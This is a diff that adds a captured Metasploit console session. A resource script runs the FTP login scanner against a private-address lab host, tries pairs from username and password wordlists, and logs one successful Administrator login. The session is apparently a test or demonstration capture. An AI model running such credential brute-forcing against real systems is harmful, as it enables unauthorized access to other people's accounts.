@@ -1,0 +1,89 @@
+[*] Starting the Metasploit Framework console.../[*] Starting the Metasploit Framework console...-[*] Starting the Metasploit Framework console...\[*] starting the Metasploit Framework console...|[*] STarting the Metasploit Framework console.../[*] StArting the Metasploit Framework console...-[*] StaRting the Metasploit Framework console...\[*] StarTing the Metasploit Framework console...|[*] StartIng the Metasploit Framework console.../[*] StartiNg the Metasploit Framework console...-[*] StartinG the Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting The Metasploit Framework console.../[*] Starting tHe Metasploit Framework console...-[*] Starting thE Metasploit Framework console...\[*] Starting the Metasploit Framework console...|[*] Starting the metasploit Framework console.../[*] Starting the MEtasploit Framework console...-[*] Starting the MeTasploit Framework console...\[*] Starting the MetAsploit Framework console...|[*] Starting the MetaSploit Framework console.../[*] Starting the MetasPloit Framework console...-[*] Starting the MetaspLoit Framework console...\                                                  
+[0m[36m[0m                          ########                  #
+                      #################            #
+                   ######################         #
+                  #########################      #
+                ############################
+               ##############################
+               ###############################
+              ###############################
+              ##############################
+                              #    ########   #
+                 [31m##[0m        [31m###[0m        ####   ##
+                                      ###   ###
+                                    ####   ###
+               ####          ##########   ####
+               #######################   ####
+                 ####################   ####
+                  ##################  ####
+                    ############      ##
+                       ########        ###
+                      #########        #####
+                    ############      ######
+                   ########      #########
+                     #####       ########
+                       ###       #########
+                      ######    ############
+                     #######################
+                     #   #   ###  #   #   ##
+                     ########################
+                      ##     ##   ##     ##
+                            https://metasploit.com[0m
+[0m
+
+       =[ [33mmetasploit v6.3.15-dev-[0m                         ]
++ -- --=[ 2312 exploits - 1208 auxiliary - 412 post       ]
++ -- --=[ 972 payloads - 46 encoders - 11 nops            ]
++ -- --=[ 9 evasion                                       ]
+
+Metasploit tip: Use the [32medit[0m command to open the 
+currently active module in your editor
+Metasploit Documentation: https://docs.metasploit.com/
+
+[1m[34m[*][0m Processing iis_ftp.rc for ERB directives.
+resource (iis_ftp.rc)> use auxiliary/scanner/ftp/ftp_login
+[0m[1m[34m[*][0m resource (iis_ftp.rc)> Ruby Code (238 bytes)
+[0mRHOSTS => 10.0.2.5
+[0muser_file => ../sample_userpass_files/usernames.txt
+[0mpass_file => ../sample_userpass_files/passwords.txt
+resource (iis_ftp.rc)> exploit
+[0m[1m[34m[*][0m 10.0.2.5:21           - 10.0.2.5:21 - Starting FTP login sweep
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Administrator:123456 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Administrator:password (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Administrator:12345678 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Administrator:1234 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Administrator:root (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Administrator:sploit (Incorrect: )
+[1m[32m[+][0m 10.0.2.5:21           - 10.0.2.5:21 - Login Successful: Administrator:vagrant
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: admin:123456 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: admin:password (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: admin:12345678 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: admin:1234 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: admin:root (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: admin:sploit (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: admin:vagrant (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Admin:123456 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Admin:password (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Admin:12345678 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Admin:1234 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Admin:root (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Admin:sploit (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: Admin:vagrant (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: root:123456 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: root:password (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: root:12345678 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: root:1234 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: root:root (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: root:sploit (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: root:vagrant (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: vagrant:123456 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: vagrant:password (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: vagrant:12345678 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: vagrant:1234 (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: vagrant:root (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: vagrant:sploit (Incorrect: )
+[1m[31m[-][0m 10.0.2.5:21           - 10.0.2.5:21 - LOGIN FAILED: vagrant:vagrant (Incorrect: )
+[1m[34m[*][0m 10.0.2.5:21           - Scanned 1 of 1 hosts (100% complete)
+[1m[34m[*][0m Auxiliary module execution completed
+resource (iis_ftp.rc)> quit
+[0m
